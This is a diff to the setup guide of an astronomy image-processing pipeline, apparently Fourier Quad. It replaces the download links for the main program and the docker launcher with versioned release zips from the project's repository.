@@ -5,8 +5,9 @@
 This guide covers **site-, camera-, and dataset-specific settings** that a new user should review before running pipeline. It does not teach numerical tuning, alternative PSF algorithms, estimator choices, or internal science branches.
 
 ## 0. Install files
-Click [here](https://github.com/LSSTDESC/DC2-production/releases/latest) to download the latest main program.
-For users who utilize the docker image, click [here](https://github.com/LSSTDESC/DC2-production/releases/latest) to download the latest launcher.
+Click [here](https://github.com/Syoong-s/Fourier_Quad_Pipeline_Neo/releases/download/v1.5.9/cpp_Standard-v1.5.9.zip) to download the latest main program.
+For users who utilize the docker image, click [here](https://github.com/Syoong-s/Fourier_Quad_Pipeline_Neo/releases/download/v1.5.9/cpp_docker-v1.5.9.zip) to download the latest launcher.
+
 ## 1. Create a run configuration
 
 The pipeline combines compiled defaults in `cpp_Standard/config/*.hpp` with optional INI overrides.
